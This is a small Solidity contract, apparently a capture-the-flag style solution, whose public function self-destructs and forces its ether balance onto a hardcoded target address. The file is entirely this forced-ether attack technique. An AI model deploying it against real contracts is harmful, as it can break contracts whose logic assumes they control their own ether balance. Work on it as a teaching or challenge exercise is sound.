// SPDX-License-Identifier: aPACHE

pragma solidity ^0.8.0;

contract F {
    // Force address
    address public force = 0x7DBD5869cBD6fD78f369F83cDc2d2c9D3fC93852;
    string public something = "";

    function rebelsneverdielastsong() public {
        selfdestruct(payable(force));
    }

    fallback() payable external{
        something = "I got money now";
    }

}